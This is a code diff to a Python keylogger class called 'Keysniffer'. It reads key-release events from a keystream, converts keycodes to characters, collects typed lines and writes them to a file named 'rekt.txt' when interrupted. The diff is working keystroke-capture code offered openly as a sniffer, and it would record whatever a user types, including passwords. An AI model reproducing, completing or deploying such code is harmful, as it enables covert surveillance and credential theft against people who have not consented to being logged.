@@ -96,14 +96,14 @@ class Keysniffer():
 				# in the format '(x)' at index [1] of the keycode line
 				if len(line[1]) == 3:
 					return line[1][1]
-				elif line[1] == '(Space)':
+				elif line[1] == '(space)':
 					return ' '
 				# if line[1] is greater than 3, it is a special key or 
 				# a punctuation/special character.
 				# TODO: implement function to convert basic special key/chars
 				# key values to their literal representations 
 				elif len(line[1]) > 3:
-					return line[1][1:-1]
+					return "[{}]".format(line[1][1:-1])
 			else:
 				continue
 
@@ -169,29 +169,31 @@ class Keysniffer():
 		
 		# stream_buffer = []
 		kc = ['']
-		for line in keystream.stdout:
-			if "release" in line:
-				kc.append(str(line).strip().split()[-1])
-				if kc[-1] == str(enter):
-					res = '+'.join(self.codesToKeys(kc))
-					print(res)
-					self.outfile.write(res)
-					kc = ['']
-			else:
-				continue
+		master_db = []
 
+		try:
+			for line in keystream.stdout:
+				if "release" in line:
+					kc.append(str(line).strip().split()[-1])
+					if kc[-1] == str(enter):
+						res = ''.join(self.codesToKeys(kc))
+						master_db.append(res)
+						kc = ['']
+				else:
+					continue
+		except KeyboardInterrupt:
+			print("Keyboard interrupt, writing captured keys to file 'rekt.txt'")
+			for entry in master_db:
+				self.outfile.write(entry + "\n")
+			self.outfile.close()
+			sys.exit(0)
+			
 
 def main():
 	ks = Keysniffer()
 	ks.keySniff()
 
 if __name__ == '__main__':
-    try:
-        main()
-    except KeyboardInterrupt:
-        print('Interrupted')
-        try:
-            sys.exit(0)
-        except SystemExit:
-            os._exit(0)
+	main()
+
 	
